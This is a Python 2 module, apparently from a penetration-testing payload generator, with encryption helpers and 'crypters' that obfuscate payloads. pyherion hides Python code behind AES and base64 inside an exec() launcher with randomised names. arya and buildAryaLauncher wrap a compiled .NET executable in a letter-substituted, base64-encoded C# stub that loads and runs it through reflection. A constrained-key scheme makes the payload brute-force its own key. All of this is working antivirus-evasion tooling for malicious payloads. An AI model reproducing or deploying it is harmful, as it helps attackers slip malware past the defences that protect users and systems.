"""
Contains any encryption-related methods that may be reused.

"""

# Import Modules
import string
import random
import base64
import urllib2
import md5
from Crypto.Cipher import DES
from Crypto.Cipher import AES
from Crypto.Cipher import ARC4

from modules.common import helpers
from modules.common import supportfiles

# AES Block Size and Padding
BlockSize = 32
Padding = '{'



#################################################################
#
# Misc helper functions.
#
#################################################################

"""
Lambda function for Padding Encrypted Text to Fit the Block
"""
pad = lambda s: s + (BlockSize - len(s) % BlockSize) * Padding


"""
Pad a string to block size, AES encrypt, then base64encode.
"""
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))


"""
Base64Decode a string, AES descrypt it, then strip padding.
"""
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(Padding)



#################################################################
#
# Various encryption methods.
#
#################################################################


def b64sub(s, key):
    """
    "Encryption" method that base64 encodes a given string,
    then does a randomized alphabetic letter substitution.
    """
    enc_tbl = string.maketrans(string.ascii_letters, key)
    return string.translate(base64.b64encode(s), enc_tbl)


def encryptAES(s):
    """
    Generates a random AES key, builds an AES cipher,
    encrypts passed 's' and returns (encrypted, randomKey)
    """
    # Generate Random AES Key
    key = helpers.randomKey()

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(key)

    # actually encrypt the text
    encrypted = EncodeAES(cipher, s)

    # return a tuple of (encodedText, randomKey)
    return (encrypted, key)

def encryptAES_http_request(s, http_key):
    """
    Generates a AES 16 Byte key from a http request of html page, builds an AES cipher,
    encrypts passed 's' and returns (encrypted, http_key)
    """
    # Generate a HTTP GET REQUEST
    m = md5.new()
    m.update(http_key)
    http_key = m.hexdigest()
    http_key = str(http_key)

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(http_key)

    # actually encrypt the text
    encrypted = EncodeAES(cipher, s)

    # return a tuple of (encodedText, randomKey)
    return (encrypted, http_key)

def constrainedAES(s):
    """
    Generates a constrained AES key which is later brute forced
    in a loop
    """
    # Create our constrained Key
    small_key = helpers.randomKey(26)

    # Actual Key used
    real_key = small_key + str(helpers.randomNumbers())

    # Create Cipher Object with Generated Secret Key
    cipher = AES.new(real_key)

    # actually encrypt the text
    encrypted = EncodeAES(cipher, s)

    # return a tuple of (encodedText, small constrained key, actual key used)
    return (encrypted, small_key, real_key)


def knownPlaintext(known_key, random_plaintext):
    """
    Uses key passed in to encrypt a random string which is
    used in a known plaintext attack to brute force its
    own key
    """
    # Create our cipher object with our known key
    stallion = AES.new(known_key)

    # Our random string is encrypted and encoded
    encrypted_string = EncodeAES(stallion, random_plaintext)

    # return our encrypted known plaintext
    return encrypted_string


def encryptDES(s):
    """
    Generates a random DES key and IV, builds an DES cipher,
    encrypts passed 's' and returns (encrypted, (randomKey, randomIV))
    """
    # get random IV Value and ARC Key
    iv = helpers.randomKey(8)
    key = helpers.randomKey(8)

    # Create DES Object and encrypt our payload
    desmain = DES.new(key, DES.MODE_CFB, iv)
    encrypted = desmain.encrypt(s)

    return (encrypted, (key, iv))


def encryptARC(s):
    """
    Generates a random ARC key and IV, builds an ARC cipher,
    encrypts passed 's' and returns (encrypted, (randomKey, randomIV))
    """
    # get random IV Value and ARC Key
    iv = helpers.randomKey(8)
    key = helpers.randomKey(8)

    # Create ARC Object and encrypt our payload
    arc4main = ARC4.new(key)
    encrypted = arc4main.encrypt(s)

    return (encrypted, (key,iv) )



#################################################################
#
# 'Crypters'/source code obfuscators.
#
#################################################################

def pyherion(code):
    """
    Generates a crypted hyperion'esque version of python code using
    base64 and AES with a random key, wrapped in an exec() dynamic launcher.

    code = the python source code to encrypt

    Returns the encrypted python code as a string.
    """

    imports = list()
    codebase = list()

    # strip out all imports from the code so pyinstaller can properly
    # launch the code by preimporting everything at compiletime
    for line in code.split("\n"):
        if not line.startswith("#"): # ignore commented imports...
            if "import" in line:
                imports.append(line)
            else:
                codebase.append(line)

    # generate a random 256 AES key and build our AES cipher
    key = helpers.randomKey(32)
    cipherEnc = AES.new(key)

    # encrypt the input file (less the imports)
    encrypted = EncodeAES(cipherEnc, "\n".join(codebase))

    # some random variable names
    b64var = helpers.randomString(5)
    aesvar = helpers.randomString(5)

    # randomize our base64 and AES importing variable
    imports.append("from base64 import b64decode as %s" %(b64var))
    imports.append("from Crypto.Cipher import AES as %s" %(aesvar))

    # shuffle up our imports
    random.shuffle(imports)

    # add in the AES imports and any imports found in the file
    crypted = ";".join(imports) + "\n"

    # the exec() launcher for our base64'ed encrypted string
    crypted += "exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted)))

    return crypted


def buildAryaLauncher(raw):
    """
    Takes a raw set of bytes and builds a launcher shell to b64decode/decrypt
    a string rep of the bytes, and then use reflection to invoke
    the original .exe

    """

    # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
    key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
    base64payload = b64sub(raw,key)

    payloadCode = "using System; using System.Collections.Generic; using System.Text;"
    payloadCode += "using System.IO; using System.Reflection; using System.Linq;\n"

    decodeFuncName = helpers.randomString()
    baseStringName = helpers.randomString()
    targetStringName = helpers.randomString()
    dictionaryName = helpers.randomString()

    # build out the letter sub decrypt function
    payloadCode += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (helpers.randomString(), helpers.randomString(), decodeFuncName)
    payloadCode += "string %s = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n" %(baseStringName)
    payloadCode += "string %s = \"\"; Dictionary<char, char> %s = new Dictionary<char, char>();\n" %(targetStringName,dictionaryName)
    payloadCode += "for (int i = 0; i < %s.Length; ++i){ %s.Add(k[i], %s[i]); }\n" %(baseStringName,dictionaryName,baseStringName)
    payloadCode += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { %s += %s[t[i]];}\n" %(targetStringName, dictionaryName)
    payloadCode += "else { %s += t[i]; }} return %s; }\n" %(targetStringName,targetStringName)

    encodedDataName = helpers.randomString()
    base64PayloadName = helpers.randomString()
    assemblyName = helpers.randomString()

    # build out Main()
    assemblyName = helpers.randomString()
    methodInfoName = helpers.randomString()
    keyName = helpers.randomString()
    payloadCode += "static void Main() {\n"
    payloadCode += "string %s = \"%s\";\n" % (base64PayloadName, base64payload)
    payloadCode += "string %s = \"%s\";\n" %(keyName, key)
    # load up the assembly of the decoded binary
    payloadCode += "Assembly %s = Assembly.Load(Convert.FromBase64String(%s(%s, %s)));\n" %(assemblyName, decodeFuncName, base64PayloadName, keyName)
    payloadCode += "MethodInfo %s = %s.EntryPoint;\n" %(methodInfoName, assemblyName)
    # use reflection to jump to its entry point
    payloadCode += "%s.Invoke(%s.CreateInstance(%s.Name), null);\n" %(methodInfoName, assemblyName, methodInfoName)
    payloadCode += "}}}\n"

    return payloadCode


def arya(source):

    # compile the source to a temporary .EXE path
    tempExePath = supportfiles.compileToTemp("cs", source)

    try:
        # read in the raw binary
        f = open(tempExePath, 'rb')
        rawBytes = f.read()
        f.close()

        # build the obfuscated launcher source and return it
        launcherCode = buildAryaLauncher(rawBytes)

        return launcherCode

    except:
        print helpers.color(" [!] Couldn't read compiled .NET source file: %s"%(tempExePath), warning=True)
        return ""
